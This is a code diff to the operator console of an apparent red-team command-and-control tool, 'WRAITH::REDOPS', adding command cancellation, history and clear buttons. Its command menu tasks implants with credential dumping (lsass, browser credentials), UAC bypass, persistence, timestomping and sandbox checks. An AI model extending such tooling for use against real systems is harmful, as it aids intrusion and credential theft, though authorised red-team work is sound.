@@ -3,6 +3,8 @@ import { Terminal } from 'xterm';
 import { FitAddon } from 'xterm-addon-fit';
 import 'xterm/css/xterm.css';
 import { invoke } from '@tauri-apps/api/core';
+import * as ipc from '../lib/ipc';
+import { useToastStore } from '../stores/toastStore';
 
 interface ConsoleProps {
   implantId: string;
@@ -14,6 +16,42 @@ export const Console = ({ implantId }: ConsoleProps) => {
   const commandHistoryRef = useRef<string[]>([]);
   const historyIndexRef = useRef<number>(-1);
   const currentCommandRef = useRef<string>('');
+  const lastCommandIdRef = useRef<string | null>(null);
+  const addToast = useToastStore((s) => s.addToast);
+
+  const handleClear = useCallback(() => {
+    if (xtermRef.current) {
+      xtermRef.current.clear();
+    }
+  }, []);
+
+  const handleHistory = useCallback(() => {
+    if (!xtermRef.current) return;
+    const terminal = xtermRef.current;
+    const history = commandHistoryRef.current;
+    if (history.length === 0) {
+      terminal.writeln('\r\n\x1b[33mCommand history is empty.\x1b[0m');
+    } else {
+      terminal.writeln('\r\n\x1b[33mCommand History:\x1b[0m');
+      history.forEach((cmd, i) => {
+        terminal.writeln(`  ${i + 1}. ${cmd}`);
+      });
+    }
+    terminal.write('$ ');
+  }, []);
+
+  const handleCancelLast = useCallback(async () => {
+    if (!lastCommandIdRef.current) {
+      addToast('warning', 'No running command to cancel');
+      return;
+    }
+    try {
+      await ipc.cancelCommand(lastCommandIdRef.current);
+      addToast('info', 'Cancel request sent');
+    } catch (e) {
+      addToast('error', 'Cancel failed: ' + e);
+    }
+  }, [addToast]);
 
   const clearLine = useCallback((terminal: Terminal, command: string) => {
     for (let i = 0; i < command.length; i++) {
@@ -47,7 +85,7 @@ export const Console = ({ implantId }: ConsoleProps) => {
 
     terminal.writeln(`\x1b[1;31mWRAITH::REDOPS\x1b[0m Interactive Console`);
     terminal.writeln(`Attached to beacon: \x1b[33m${implantId}\x1b[0m`);
-    terminal.writeln(`\x1b[90mType 'help' for available commands.\x1b[0m`);
+    terminal.writeln(`\x1b[90mType 'help' for available commands. Ctrl+X to cancel last command.\x1b[0m`);
     terminal.write('\r\n$ ');
 
     let command = '';
@@ -115,6 +153,18 @@ export const Console = ({ implantId }: ConsoleProps) => {
             terminal.writeln('  browser          - Harvest browser creds');
             terminal.writeln('  netscan <target> - Network scan');
             terminal.writeln('  stopsvc <name>   - Stop service');
+            terminal.writeln('  cancel           - Cancel last running command');
+          } else if (trimmed === 'cancel') {
+            if (lastCommandIdRef.current) {
+              try {
+                await ipc.cancelCommand(lastCommandIdRef.current);
+                terminal.writeln('\x1b[33mCancel request sent\x1b[0m');
+              } catch (e) {
+                terminal.writeln(`\x1b[31mCancel failed:\x1b[0m ${e}`);
+              }
+            } else {
+              terminal.writeln('\x1b[33mNo running command to cancel\x1b[0m');
+            }
           } else if (trimmed.startsWith('setprofile ')) {
             const script = trimmed.substring(11);
             try {
@@ -136,14 +186,14 @@ export const Console = ({ implantId }: ConsoleProps) => {
             const parts = trimmed.split(' ');
             const cmdName = parts[0];
             const args = parts.slice(1).join(' ');
-            
+
             let type = 'shell';
             let payload = trimmed;
 
             switch(cmdName) {
                 case 'powershell': type = 'powershell'; payload = args; break;
                 case 'persist': type = 'persist'; payload = args; break;
-                case 'lsass': type = 'dump_lsass'; payload = args; break; // args can be output path?
+                case 'lsass': type = 'dump_lsass'; payload = args; break;
                 case 'uac': type = 'uac_bypass'; payload = args; break;
                 case 'timestomp': type = 'timestomp'; payload = args; break;
                 case 'sandbox': type = 'sandbox_check'; payload = ''; break;
@@ -159,18 +209,17 @@ export const Console = ({ implantId }: ConsoleProps) => {
                 case 'browser': type = 'browser'; payload = ''; break;
                 case 'netscan': type = 'net_scan'; payload = args; break;
                 case 'stopsvc': type = 'service_stop'; payload = args; break;
-                default: 
-                    // Assume shell if unknown? Or raw?
-                    // Let's assume shell for now for raw commands
+                default:
                     type = 'shell'; payload = trimmed;
             }
 
             try {
-              await invoke('send_command', {
+              const cmdId = await invoke('send_command', {
                 implantId,
                 commandType: type,
                 payload: payload,
-              });
+              }) as string;
+              lastCommandIdRef.current = cmdId;
               terminal.writeln(`\x1b[32mQueued task:\x1b[0m ${type}`);
             } catch (e) {
               terminal.writeln(`\x1b[31mError:\x1b[0m ${e}`);
@@ -190,6 +239,9 @@ export const Console = ({ implantId }: ConsoleProps) => {
         terminal.write('^C\r\n$ ');
         command = '';
         historyIndexRef.current = -1;
+      } else if (data === '\x18') {
+        // Ctrl+X = cancel last command
+        handleCancelLast();
       } else if (data.charCodeAt(0) >= 32) {
         command += data;
         terminal.write(data);
@@ -202,15 +254,16 @@ export const Console = ({ implantId }: ConsoleProps) => {
       window.removeEventListener('resize', handleResize);
       terminal.dispose();
     };
-  }, [implantId, clearLine]);
+  }, [implantId, clearLine, handleCancelLast]);
 
   return (
     <div className="flex flex-col h-full overflow-hidden rounded border border-slate-800 bg-slate-900 shadow-inner">
       <div className="flex items-center justify-between px-3 py-1 bg-slate-800 text-[10px] text-slate-400 uppercase tracking-wider">
         <span className="font-bold text-red-500">Beacon Console: {implantId.substring(0, 8)}</span>
         <div className="flex gap-2">
-            <span className="cursor-pointer hover:text-white">Clear</span>
-            <span className="cursor-pointer hover:text-white">History</span>
+            <button onClick={handleClear} className="cursor-pointer hover:text-white transition-colors">Clear</button>
+            <button onClick={handleHistory} className="cursor-pointer hover:text-white transition-colors">History</button>
+            <button onClick={handleCancelLast} className="cursor-pointer hover:text-red-400 transition-colors">Cancel</button>
         </div>
       </div>
       <div ref={terminalRef} className="flex-1 p-2 overflow-hidden" />
